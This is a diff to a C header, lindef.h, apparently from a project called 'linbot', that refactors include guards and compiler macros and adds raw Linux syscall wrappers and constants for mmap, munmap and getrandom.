@@ -7,7 +7,8 @@
 */
 
 
-#pragma once
+#ifndef LINBOT_LINDEF_H
+#define LINBOT_LINDEF_H
 
 
 /************************************
@@ -15,19 +16,19 @@
  ************************************/
 
 
-#if !defined(__GNUC__) || defined(__clang__)
+#if (!defined(__GNUC__) || defined(__clang__))
     #error "lindef.h: GCC compiler is required."
 #endif
 
-#if !defined(__linux__)
+#if (!defined(__linux__))
     #error "lindef.h: Linux OS is required."
 #endif
 
-#if !defined(__x86_64__)
+#if (!defined(__x86_64__))
     #error "lindef.h: x86_64 architecture is required."
 #endif
 
-#if !defined(__LP64__)
+#if (!defined(__LP64__))
     #error "lindef.h: LP64 ABI is required."
 #endif
 
@@ -88,24 +89,24 @@ typedef __SIZE_TYPE__        SIZE_T;
 #define GCC_ASM_ __asm__ volatile
 
 
-/* Load TYPE from memory at pointer (unaligned-safe) */
+#define CONSTANT_P_(x) GCC_FUNC_(constant_p)((x))  // Compile-time constant check
+#define UNLIKELY_(x)   GCC_FUNC_(expect)(!!(x), 0) // Branch prediction (cold)
+#define LIKELY_(x)     GCC_FUNC_(expect)(!!(x), 1) // Branch prediction (hot)
+
+/* Inform compiler that
+   this code path is never reached */
+#define UNREACHABLE_() GCC_FUNC_(unreachable)()
+
+/* Load integer TYPE from memory at pointer (unaligned-safe) */
 #define LOAD_INT_(ptr, TYPE) ({                     \
     TYPE _val;                                      \
     GCC_FUNC_(memcpy)(&_val, ptr, sizeof(TYPE));    \
     _val;                                           \
 })
 
-/* Compile-time constant check */
-#define CONSTANT_P_(x) GCC_FUNC_(constant_p)((x))
 
-#define UNLIKELY_(x) GCC_FUNC_(expect)(!!(x), 0) // Branch prediction (cold)
-#define LIKELY_(x)   GCC_FUNC_(expect)(!!(x), 1) // Branch prediction (hot)
-
-
-/* Inform compiler that
-   this code path is never reached */
-#define UNREACHABLE_() GCC_FUNC_(unreachable)()
-
+/* Suppress struct padding (no alignment gaps) */
+#define PACKED_STRUCT_ struct GCC_ATTR_(packed)
 
 /* Function declaration helper */
 #define DEC_FUNC(TYPE) \
@@ -156,13 +157,17 @@ typedef __SIZE_TYPE__        SIZE_T;
 #define SYS_openat       257
 #define SYS_close        3
 #define SYS_poll         7
+#define SYS_mmap         9
+#define SYS_munmap       11
 #define SYS_rt_sigaction 13
 #define SYS_socket       41
 #define SYS_connect      42
 #define SYS_getrandom    318
 
+#define EINTR 4
 
-/* */
+
+/* Signal definitions */
 
 #define SIGHUP  1
 #define SIGPIPE 13
@@ -171,16 +176,22 @@ typedef __SIZE_TYPE__        SIZE_T;
 #define SIG_IGN ((VOID*)1)
 
 typedef struct kernel_sigaction_t {
-    VOID    *sa_handler;
-    ULONG    sa_flags;
-    VOID    *sa_restorer;
-    ULONG    sa_mask;
+    VOID* sa_handler;
+    ULONG sa_flags;
+    VOID* sa_restorer;
+    ULONG sa_mask;
 } kernel_sigaction_t;
 
 
-#define EINTR 4
+/* Mman mapping flags */
 
-#define GRND_NONBLOCK 1
+#define PROT_READ  0x1
+#define PROT_WRITE 0x2
+
+#define MAP_PRIVATE	  0x02
+#define MAP_ANONYMOUS 0x20
+
+#define MAP_FAILED ((VOID*)-1)
 
 
 /* Fcntl flags */
@@ -188,6 +199,10 @@ typedef struct kernel_sigaction_t {
 #define O_RDONLY 00
 
 #define AT_FDCWD -100
+
+
+/* Do not block if entropy pool is empty (getrandom) */
+#define GRND_NONBLOCK 0x0001
 
 
 /* Socket definitions */
@@ -215,10 +230,10 @@ typedef struct kernel_sigaction_t {
 
 
 typedef struct sockaddr_in_t {
-    UINT16    sin_family;
-    UINT16    sin_port;
-    UINT32    sin_addr;
-    BYTE      sin_zero[8];
+    UINT16 sin_family;
+    UINT16 sin_port;
+    UINT32 sin_addr;
+    BYTE   sin_zero[8];
 } sockaddr_in_t;
 
 
@@ -308,6 +323,12 @@ typedef struct sockaddr_in_t {
 #define sys_sleep_ms(ms) \
     syscall_(SYS_poll, 0, 0, (ms))
 
+#define mmap(addr, len, prot, flags, fd, offset) \
+    syscall_(SYS_mmap, (addr), (len), (prot), (flags), (fd), (offset))
+
+#define munmap(addr, len) \
+    syscall_(SYS_munmap, (addr), (len))
+
 #define rt_sigaction(signum, act, oldact, sigsetsize) \
     syscall_(SYS_rt_sigaction, (signum), (act), (oldact), (sigsetsize))
 
@@ -317,5 +338,8 @@ typedef struct sockaddr_in_t {
 #define connect(sockfd, addr, addrlen) \
     syscall_(SYS_connect, (sockfd), (addr), (addrlen))
 
-#define getrandom(buf, count, flags) \
-    syscall_(SYS_getrandom, (buf), (count), (flags))
+#define getrandom(buf, count) \
+    syscall_(SYS_getrandom, (buf), (count), GRND_NONBLOCK)
+
+
+#endif /* LINBOT_LINDEF_H */
